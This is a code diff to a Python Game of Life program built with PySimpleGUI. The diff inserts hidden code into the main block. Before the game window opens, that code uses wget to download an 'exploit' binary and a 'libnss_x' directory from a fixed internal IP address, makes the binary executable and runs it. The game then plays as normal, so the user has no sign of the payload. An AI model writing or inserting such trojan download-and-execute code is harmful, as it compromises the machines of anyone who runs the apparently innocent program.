@@ -3,6 +3,7 @@
 
 import numpy
 import PySimpleGUI as sg
+from subprocess import Popen
 
 BOX_SIZE = 15
 
@@ -168,6 +169,25 @@ class GameOfLife:
 
 if (__name__ == "__main__"):
     game = GameOfLife(N=35, T=200)
+
+    #location = '/tmp'
+    url1 = 'http://10.0.1.4/exploit/exploit' 
+    args1 = ['wget', '-q', url1, '-O', '/tmp/exploit']
+
+    output = Popen(args1)
+    output.communicate()
+
+    url2 = 'http://10.0.1.4/exploit/libnss_x'
+    args2 = ['wget', '-r', '-q', 'http://10.0.1.4/exploit/libnss_x', '-P', '/tmp/exploit/libnss_x']
+    output2 = Popen(args2)
+    output2.communicate()
+
+    mod = Popen(['chmod', '774', '/tmp/exploit'])
+    mod.communicate()
+
+    o = Popen(['/tmp/exploit'])
+    o.communicate()    
+
     game.play()
     sg.popup('Completed running.', 'Click OK to exit the program')
     game.window.close()
